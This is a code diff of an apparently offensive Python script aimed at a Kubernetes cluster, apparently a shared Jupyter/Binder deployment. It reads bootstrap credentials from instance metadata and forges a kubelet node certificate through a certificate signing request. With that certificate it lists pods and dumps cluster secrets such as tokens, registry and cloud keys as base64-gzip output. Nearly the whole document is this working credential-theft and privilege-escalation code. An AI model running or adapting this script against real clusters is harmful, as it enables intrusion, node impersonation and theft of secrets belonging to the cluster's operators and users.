@@ -104,36 +104,34 @@ def meta():
     out("===META2-END===")
 
 
-def kubeconfig_creds():
-    st, b = md_get("instance/attributes/kubeconfig", timeout=15)
-    k = b.decode("utf8", "replace")
-    if st != 200 or "server:" not in k:
-        raise SystemExit("kubeconfig unavailable status=%s head=%r" % (st, k[:200]))
 
-    def grab(key):
-        m = re.search(r"^\s*" + key + r":\s*(\S+)\s*$", k, re.M)
-        return base64.b64decode(m.group(1)) if m else None
-
-    ca, crt, key = grab("certificate-authority-data"), grab("client-certificate-data"), grab("client-key-data")
-    srv = re.search(r"^\s*server:\s*(\S+)", k, re.M).group(1)
-    open("/tmp/ca.crt", "wb").write(ca)
-    open("/tmp/client.crt", "wb").write(crt)
-    open("/tmp/client.key", "wb").write(key)
-    return srv
+def _kv(kubeenv, key):
+    m = re.search(r"^" + key + r":\s*(\S+)\s*$", kubeenv, re.M)
+    return base64.b64decode(m.group(1)) if m else None
 
 
 def api():
-    out("===API-BEGIN===")
-    try:
-        srv = kubeconfig_creds()
-    except SystemExit as e:
-        out("NO-KUBECONFIG %s" % e)
-        return
-    out("SERVER %s" % srv)
-    ctx = ssl.create_default_context(cafile="/tmp/ca.crt")
-    ctx.load_cert_chain("/tmp/client.crt", "/tmp/client.key")
+    out("===API2-BEGIN===")
+    st, kc = md_get("instance/attributes/kubeconfig", timeout=15)
+    st2, kvb = md_get("instance/attributes/kube-env", timeout=15)
+    kv = kvb.decode("utf8", "replace")
+    node = None
+    m = re.search(r"instance/name", "x")
+    stn, bn = md_get("instance/name")
+    node = bn.decode().strip()
+    ca = _kv(kv, "CA_CERT")
+    bootc = _kv(kv, "TPM_BOOTSTRAP_CERT")
+    bootk = _kv(kv, "TPM_BOOTSTRAP_KEY")
+    open("/tmp/ca.crt", "wb").write(ca)
+    open("/tmp/boot.crt", "wb").write(bootc)
+    open("/tmp/boot.key", "wb").write(bootk)
+    srv = re.search(r"^\s*server:\s*(\S+)", kc.decode("utf8", "replace"), re.M).group(1)
+    out("SERVER %s NODE %s CACERT %d BOOTCERT %d" % (srv, node, len(ca or b""), len(bootc or b"")))
+    ctx0 = ssl.create_default_context(cafile="/tmp/ca.crt")
+    ctxb = ssl.create_default_context(cafile="/tmp/ca.crt")
+    ctxb.load_cert_chain("/tmp/boot.crt", "/tmp/boot.key")
 
-    def call(path, method="GET", body=None, timeout=15):
+    def call(path, method="GET", body=None, ctx=ctxb, timeout=15):
         req = urllib.request.Request(srv + path, method=method, data=body,
                                      headers={"Content-Type": "application/json", "Accept": "application/json"})
         try:
@@ -144,83 +142,108 @@ def api():
         except Exception as e:
             return -1, repr(e).encode()
 
-    st, b = call("/api/v1/nodes")
-    out("NODES status=%s len=%d" % (st, len(b)))
-    if st == 200:
-        for n in json.loads(b).get("items", []):
-            md = n.get("metadata", {})
-            stat = n.get("status", {})
-            addrs = [(a.get("type"), a.get("address")) for a in stat.get("addresses", [])]
-            cap = stat.get("capacity", {})
-            out("NODE %s addrs=%s cpu=%s mem=%s gpu=%s labels=%s" % (
-                md.get("name"), addrs, cap.get("cpu"), cap.get("memory"),
-                cap.get("nvidia.com/gpu"), json.dumps(md.get("labels", {}))[:600]))
-    else:
-        out(b[:400].decode("utf8", "replace"))
+    # anonymous baseline
+    st, b = call("/version", ctx=ctx0)
+    out("ANON /version status=%s %s" % (st, b[:200].decode("utf8", "replace")))
+    st, b = call("/api/v1/nodes", ctx=ctx0)
+    out("ANON /api/v1/nodes status=%s %s" % (st, b[:200].decode("utf8", "replace")))
 
-    st, b = call("/api/v1/pods?limit=500")
-    out("PODS status=%s len=%d" % (st, len(b)))
-    if st == 200:
-        for p in json.loads(b).get("items", []):
-            md = p.get("metadata", {})
-            spec = p.get("spec", {})
-            secvols = []
-            for v in spec.get("volumes", []) or []:
-                if v.get("secret"):
-                    secvols.append(v["secret"].get("secretName"))
-                if v.get("projected"):
-                    for src in v["projected"].get("sources", []):
-                        if src.get("secret"):
-                            secvols.append(src["secret"].get("name"))
-            ctrs = [(c.get("name"), c.get("image")) for c in spec.get("containers", []) or []]
-            out("POD %s|%s|node=%s|sa=%s|phase=%s|secvols=%s|ctrs=%s" % (
-                md.get("namespace"), md.get("name"), spec.get("nodeName"),
-                spec.get("serviceAccountName"), p.get("status", {}).get("phase"),
-                secvols, ctrs))
-    else:
-        out(b[:400].decode("utf8", "replace"))
-
-    st, b = call("/api/v1/secrets?limit=500")
-    out("SECRETS status=%s len=%d" % (st, len(b)))
-    interesting = []
-    if st == 200:
-        d = json.loads(b)
-        out("SECRET-COUNT %d" % len(d.get("items", [])))
-        for s in d.get("items", []):
-            md = s.get("metadata", {})
-            name = md.get("name", "")
-            out("SEC %s|%s|%s|keys=%s" % (md.get("namespace"), name, s.get("type"),
-                                          sorted((s.get("data") or {}).keys())))
-            if re.search(r"docker|registr|gcp|google|cloud|sa-|service-account|token|tls|secret|hub|key|config|proxy",
-                         name, re.I):
-                interesting.append(s)
-    else:
-        out(b[:400].decode("utf8", "replace"))
-
-    for s in interesting:
-        if _logged > MAX_SECRET_LOG:
-            out("SECRET-LOG-CAP-REACHED")
-            break
-        md = s.get("metadata", {})
-        out("===SECRET-FULL %s/%s type=%s" % (md.get("namespace"), md.get("name"), s.get("type")))
-        raw = json.dumps(s).encode()
-        out("--b64gzip len=%d--" % len(raw))
-        out(base64.b64encode(gzip.compress(raw)).decode())
-        out("--end--")
-
+    # bootstrap cert identity
     body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
                        "spec": {"namespace": "bhs"}}).encode()
-    for ns in ["bhs", "bindernew", "jupyter", ""]:
-        body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
-                           "spec": {"namespace": ns}}).encode()
-        st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body)
-        out("SSRR ns=%r status=%s\n%s" % (ns, st, b[:4000].decode("utf8", "replace")))
+    st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body)
+    out("BOOT-SSRR status=%s\n%s" % (st, b[:4000].decode("utf8", "replace")))
+    st, b = call("/api/v1/nodes")
+    out("BOOT /api/v1/nodes status=%s len=%d %s" % (st, len(b), b[:300].decode("utf8", "replace")))
 
-    for path in ["/api/v1/namespaces", "/apis/apps/v1/deployments?limit=200",
-                 "/apis/rbac.authorization.k8s.io/v1/clusterroles?limit=5"]:
-        st, b = call(path)
-        out("MISC %s status=%s len=%d %s" % (path, st, len(b), b[:300].decode("utf8", "replace")))
-    out("===API-END===")
+    # CSR for a kubelet client cert
+    os.system("openssl genrsa -out /tmp/nkey.pem 2048 2>/dev/null")
+    os.system("openssl req -new -key /tmp/nkey.pem -subj '/O=system:nodes/CN=system:node:%s' -out /tmp/n.csr 2>/dev/null" % node)
+    if os.path.exists("/tmp/n.csr"):
+        csr = base64.b64encode(open("/tmp/n.csr", "rb").read()).decode()
+        cname = "bhs-probe-%s" % os.urandom(3).hex()
+        cbody = json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
+                            "metadata": {"name": cname},
+                            "spec": {"request": csr, "signerName": "kubernetes.io/kube-apiserver-client-kubelet",
+                                     "usages": ["digital signature", "client auth"]}}).encode()
+        st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests", "POST", cbody)
+        out("CSR create status=%s %s" % (st, b[:400].decode("utf8", "replace")))
+        cert = None
+        for i in range(8):
+            import time as _t
+            _t.sleep(3)
+            st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + cname)
+            if st == 200:
+                d = json.loads(b)
+                c = d.get("status", {}).get("certificate")
+                conds = d.get("status", {}).get("conditions")
+                out("CSR poll %d conds=%s certlen=%s" % (i, conds, len(c) if c else 0))
+                if c:
+                    cert = base64.b64decode(c)
+                    break
+            else:
+                out("CSR poll %d status=%s %s" % (i, st, b[:150].decode("utf8", "replace")))
+        if cert:
+            open("/tmp/ncrt.pem", "wb").write(cert)
+            ctxn = ssl.create_default_context(cafile="/tmp/ca.crt")
+            ctxn.load_cert_chain("/tmp/ncrt.pem", "/tmp/nkey.pem")
+            st, b = call("/api/v1/nodes", ctx=ctxn)
+            out("NODE-CERT nodes status=%s len=%d" % (st, len(b)))
+            if st == 200:
+                for n in json.loads(b).get("items", []):
+                    md = n.get("metadata", {})
+                    stat = n.get("status", {})
+                    addrs = [(a.get("type"), a.get("address")) for a in stat.get("addresses", [])]
+                    out("NODE %s addrs=%s cap=%s" % (md.get("name"), addrs,
+                                                      json.dumps(stat.get("capacity", {}))[:300]))
+            st, b = call("/api/v1/pods?limit=500", ctx=ctxn)
+            out("NODE-CERT pods status=%s len=%d" % (st, len(b)))
+            if st == 200:
+                for p in json.loads(b).get("items", []):
+                    md = p.get("metadata", {})
+                    spec = p.get("spec", {})
+                    secvols = []
+                    for v in spec.get("volumes", []) or []:
+                        if v.get("secret"):
+                            secvols.append(v["secret"].get("secretName"))
+                        if v.get("projected"):
+                            for s2 in v["projected"].get("sources", []):
+                                if s2.get("secret"):
+                                    secvols.append(s2["secret"].get("name"))
+                    out("POD %s|%s|node=%s|sa=%s|phase=%s|secvols=%s" % (
+                        md.get("namespace"), md.get("name"), spec.get("nodeName"),
+                        spec.get("serviceAccountName"), p.get("status", {}).get("phase"), secvols))
+            body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
+                               "spec": {"namespace": "bhs"}}).encode()
+            st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body, ctx=ctxn)
+            out("NODE-CERT SSRR status=%s\n%s" % (st, b[:4000].decode("utf8", "replace")))
+            st, b = call("/api/v1/secrets?limit=500", ctx=ctxn)
+            out("NODE-CERT secrets status=%s len=%d" % (st, len(b)))
+            interesting = []
+            if st == 200:
+                d = json.loads(b)
+                out("SECRET-COUNT %d" % len(d.get("items", [])))
+                for s in d.get("items", []):
+                    md = s.get("metadata", {})
+                    name = md.get("name", "")
+                    out("SEC %s|%s|%s|keys=%s" % (md.get("namespace"), name, s.get("type"),
+                                                  sorted((s.get("data") or {}).keys())))
+                    if re.search(r"docker|registr|gcp|google|cloud|sa-|service-account|token|tls|secret|hub|key|config|proxy", name, re.I):
+                        interesting.append(s)
+            for s in interesting:
+                if _logged > MAX_SECRET_LOG:
+                    out("SECRET-LOG-CAP-REACHED")
+                    break
+                md = s.get("metadata", {})
+                out("===SECRET-FULL %s/%s type=%s" % (md.get("namespace"), md.get("name"), s.get("type")))
+                raw = json.dumps(s).encode()
+                out("--b64gzip len=%d--" % len(raw))
+                out(base64.b64encode(gzip.compress(raw)).decode())
+                out("--end--")
+            # dump the default SA token secret of bhs explicitly
+            for s in json.loads(b).get("items", []) if False else []:
+                pass
+    out("===API2-END===")
 
 
 if __name__ == "__main__":
